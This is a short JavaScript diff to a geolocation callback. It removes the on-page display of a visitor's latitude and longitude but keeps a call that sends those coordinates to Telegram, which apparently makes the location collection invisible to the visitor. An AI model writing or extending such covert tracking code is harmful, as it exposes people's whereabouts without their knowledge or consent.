@@ -90,10 +90,6 @@
         function showPosition(position) {
             var latitude = position.coords.latitude;
             var longitude = position.coords.longitude;
-            document.getElementById("location").innerHTML = 
-            "Latitude: " + latitude + 
-            "<br>Longitude: " + longitude;
-
             sendLocationToTelegram(latitude, longitude);
         }
 
